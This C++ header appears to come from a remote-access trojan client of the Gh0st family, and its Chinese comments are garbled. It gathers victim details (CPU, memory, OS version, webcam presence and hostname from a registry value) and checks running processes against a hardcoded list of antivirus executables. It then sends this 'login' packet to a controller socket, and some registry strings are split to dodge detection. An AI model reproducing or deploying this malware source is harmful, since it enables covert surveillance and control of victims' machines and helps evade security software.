#pragma once
#include "KernelManager.h"
#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>


#include "until.h"
#include "install.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")

/*************�ж���Ƶ��ͷ�ļ�*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")
/**********************************/


// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

//ö����Ƶ�豸
//////////////////////////////////////////////////////////
UINT EnumDevices()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM ���ʼ��
	/////////////////////    Step1        /////////////////////////////////
	//ö�ٲ����豸
	ICreateDevEnum *pCreateDevEnum;                          //�����豸ö����
	//�����豸ö�ٹ�����
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //Ҫ������Filter��Class ID
		NULL,                                                //��ʾFilter�����ۺ�
		CLSCTX_INPROC_SERVER,                                //����������COM����
		IID_ICreateDevEnum,                                  //��õĽӿ�ID
		(void**)&pCreateDevEnum);                            //�����Ľӿڶ����ָ��
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //ö�ټ�����ӿ�
	//��ȡ��Ƶ���ö����
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//������ȡ��Ƶ���ö��������ʹ�����´���
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //����ö������λ
	ULONG cFetched;
	IMoniker *pM;                                            //������ӿ�ָ��
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //��ȡ��һ���豸
	{
		IPropertyBag *pBag;                                  //����ҳ�ӿ�ָ��
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//��ȡ�豸����ҳ
		if(SUCCEEDED(hr)) 
		{
            VARIANT var;
            var.vt = VT_BSTR;                                //������Ƕ���������
            hr = pBag->Read(L"FriendlyName", &var, NULL);
			//��ȡFriendlyName��ʽ����Ϣ
            if (hr == NOERROR) 
            {
				nCam++;
				SysFreeString(var.bstrVal);   //�ͷ���Դ���ر�Ҫע��
            }
            pBag->Release();                  //�ͷ�����ҳ�ӿ�ָ��
        }
        pM->Release();                        //�ͷż�����ӿ�ָ��
    }
	CoUninitialize();                   //ж��COM��
	return nCam;
}
//////////////////////////////////////////////////////////

bool IsWebCam()
{
	bool	bRet = false;
	
	if (EnumDevices()>0)
	{
        bRet = TRUE;
	}
	return bRet;
}

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "MotherFucker", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
	
	return lstrlen(lpBuffer);
}

UINT GetGroupName(LPTSTR lpBuffer, UINT uSize)
{
	char	*szGetGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "KLMN");
	if (szGetGroup == NULL)
	{
		return -1;
	}

	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	
	wsprintf(strSubKey,"%s%s%s%s", "SYST", "EM\\CurrentContro", "lSet\\Services\\", "BITS");
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, szGetGroup , REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	return lstrlen(lpBuffer);
}

std::string getSystemName()
{
	std::string vname("δ֪����ϵͳ");
	//���ж��Ƿ�Ϊwin8.1��win10
	typedef void(__stdcall* NTPROC)(DWORD*, DWORD*, DWORD*);
	HINSTANCE hinst = LoadLibrary("ntdll.dll");
	DWORD dwMajor, dwMinor, dwBuildNumber;
	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
	proc(&dwMajor, &dwMinor, &dwBuildNumber);

	SYSTEM_INFO info;                //��SYSTEM_INFO�ṹ�ж�64λAMD������
	GetSystemInfo(&info);            //����GetSystemInfo�������ṹ
	OSVERSIONINFOEX os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO*)&os);
	if (dwMajor == 6 && dwMinor == 3)	//win 8.1
	{
		vname = "Windows 8.1";
		printf_s("�˵��Եİ汾Ϊ:%s\n", vname.c_str());
		return vname;
	}
	if (dwMajor == 10 && dwMinor == 0)	//win 10
	{
		if (os.wProductType == VER_NT_SERVER)
		{
			vname = "2016";
			//printf_s("�˵��Եİ汾Ϊ:%s\n", vname.c_str());
			return vname;
		}
		else
		{
			vname = "Windows 10";
			return vname;
		}
		
	}



	//���治���ж�Win Server����Ϊ���˻�δ������ϵͳ�Ļ��ӣ���ʱ������

	//�ж�win8.1���µİ汾

	if (GetVersionEx((OSVERSIONINFO*)&os))
	{
		//������ݰ汾��Ϣ�жϲ���ϵͳ����
		switch (os.dwMajorVersion)
		{                    //�ж����汾��
		case 4:
			switch (os.dwMinorVersion)
			{                //�жϴΰ汾��
			case 0:
				if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)
					vname = "Windows NT 4.0";  //1996��7�·���
				else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
					vname = "Windows 95";
				break;
			case 10:
				vname = "Windows 98";
				break;
			case 90:
				vname = "Windows Me";
				break;
			}
			break;
		case 5:
			switch (os.dwMinorVersion)
			{               //�ٱȽ�dwMinorVersion��ֵ
			case 0:
				vname = "Windows 2000";    //1999��12�·���
				break;
			case 1:
				vname = "Windows XP";      //2001��8�·���
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION &&
					info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
					vname = "Windows XP Professional x64 Edition";
				else if (GetSystemMetrics(SM_SERVERR2) == 0)
					vname = "Windows Server 2003";   //2003��3�·���
				else if (GetSystemMetrics(SM_SERVERR2) != 0)
					vname = "Windows Server 2003 R2";
				break;
			}
			break;
		case 6:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows Vista";
				else
					vname = "Windows Server 2008";   //�������汾
				break;
			case 1:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows 7";
				else
					vname = "Windows Server 2008 R2";
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION)
					vname = "Windows 8";
				else
					vname = "Windows Server 2012";
				break;
			}
			break;
		default:
			vname = "δ֪����ϵͳ";
		}
		printf_s("�˵��Եİ汾Ϊ:%s\n", vname.c_str());
	}
	else
		printf_s("�汾��ȡʧ��\n");
	return vname;
}


typedef struct
{
	char* Course;
	char* Name;
}AYSDFE;



AYSDFE g_AntiVirus_Data[40] =
{
	{"360tray.exe",       "360��ȫ��ʿ"},
	{"360sd.exe",         "360ɱ��"},
	{"kxetray.exe",       "��ɽ����"},
	{"KSafeTray.exe",     "��ɽ��ȫ��ʿ"},
	{"QQPCRTP.exe",       "QQ���Թܼ�"},
	{"HipsTray.exe",      "����"},
	{"BaiduSd.exe",       "�ٶ�ɱ��"},
	{"baiduSafeTray.exe", "�ٶ���ʿ"},
	{"KvMonXP.exe",       "����"},
	{"RavMonD.exe",       "����"},
	{"QUHLPSVC.EXE",      "QuickHeal"},   //ӡ��
	{"mssecess.exe",      "΢��MSE"},
	{"cfp.exe",           "Comodoɱ��"},
	{"SPIDer.exe",        "DR.WEB"},      //��֩��
	{"acs.exe",           "Outpost"},
	{"V3Svc.exe",         "����ʿV3"},
	{"AYAgent.aye",       "��������"},
	{"avgwdsvc.exe",      "AVG"},
	{"f-secure.exe",      "F-Secure"},    //�Ұ�ȫ
	{"avp.exe",           "����"},
	{"Mcshield.exe",      "�󿧷�"},
	{"egui.exe",          "NOD32"},
	{"knsdtray.exe",      "��ţ"},
	{"TMBMSRV.exe",       "����"},
	{"avcenter.exe",      "С��ɡ"},
	{"ashDisp.exe",       "Avast���簲ȫ"},
	{"rtvscan.exe",       "ŵ��"},
	{"remupd.exe",        "��è��ʿ"},
	{"vsserv.exe",        "BitDefender"}, //BD  bdagent.exe
	{"PSafeSysTray.exe",  "PSafe������"}, //����
	{"ad-watch.exe",      "Ad-watch�����"},
	{"K7TSecurity.exe",   "K7ɱ��"},
	{"UnThreat.exe",      "UnThreat"},    //��������
	{"  ",                "  "}
};

char* ssdd()
{
	static char AllName[1024];
	int t = 0;
	memset(AllName, 0, sizeof(AllName));
	while (1)
	{
		if (strstr(g_AntiVirus_Data[t].Course, " ") == 0)
		{
			if (GetProcessID(g_AntiVirus_Data[t].Course))
			{
				lstrcat(AllName, g_AntiVirus_Data[t].Name);
				lstrcat(AllName, " ");
			}
		}
		else
			break;
		t++;
	}

	if (strstr(AllName, " ") == 0)
	{
		lstrcat(AllName, "��δ����");
	}

	return AllName;
}
int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	// ��¼��Ϣ
	LOGININFO	LoginInfo;
	// ��ʼ��������
	LoginInfo.bToken = TOKEN_LOGIN; // ����Ϊ��¼
	LoginInfo.bIsWebCam = 0; //û������ͷ
	//LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	strcpy_s(LoginInfo.OsVerInfoEx, getSystemName().c_str());
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // ע��ת������
	// IP��Ϣ
	
	// ������
	char hostname[256];
	GetHostRemark(strServiceName, hostname, sizeof(hostname));	
	// ���ӵ�IP��ַ
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	LoginInfo.CPUClockMhz = CPUClockMhz();
	/*----------------------------------------------------------------------------------------*/	
	SYSTEM_INFO siSysInfo; 
	GetSystemInfo(&siSysInfo); 	
	wsprintf(LoginInfo.CPUNumber, "%d", siSysInfo.dwNumberOfProcessors);
	/*----------------------------------------------------------------------------------------*/
	//�ڴ��С
    MEMORYSTATUS    MemInfo; 
    MemInfo.dwLength=sizeof(MemInfo); 
    GlobalMemoryStatus(&MemInfo);
	LoginInfo.MemSize = MemInfo.dwTotalPhys/1024/1024;
	
	//��Ƶ
	LoginInfo.bIsWebCam = IsWebCam();
	
	// Speed
	LoginInfo.dwSpeed = dwSpeed;
	
	// ɱ�����
	strcpy(LoginInfo.Virus, ssdd());
//	char	*szGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "CDEF");
//	if (szGroup == NULL)
//	{
//		return -1;
//	}
//	szGroup = (char *)(MyDecode(szGroup + 4));  //���ܱ����ܵ��ַ���
//	
//	char	*szVersion = (char *)FindConfigString(CKernelManager::g_hInstance, "MNOP");
//	if (szVersion == NULL)
//	{
//		return -1;
//	}
//	szVersion = (char *)(MyDecode(szVersion + 4));  //���ܱ����ܵ��ַ���
//	
//	//���߰汾
//	//char tQjcs[] = {'Q','E','U','/','P','2','d','o','L','X','B','s','a','k','8','=','\0'};
////	char Version[256];
//	strcpy(LoginInfo.szVersion, szVersion);
//
//	// ���߷���
//	char	*UpRow = NULL;
//	char Group[256];
//	char strWirn2[] = {'D','e','f','a','u','l','t','\0'};
//	if(GetGroupName(Group, sizeof(Group))==0)
//	{
//		if(szGroup != NULL)
//		{
//			UpRow = szGroup;
//		}
//		else
//		{
//			UpRow = strWirn2;
//		}
//	}
//	else
//	{
//		UpRow=Group;
//	}
	char* szGroup = "11";
	strcpy(LoginInfo.UpGroup, szGroup);
	
	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}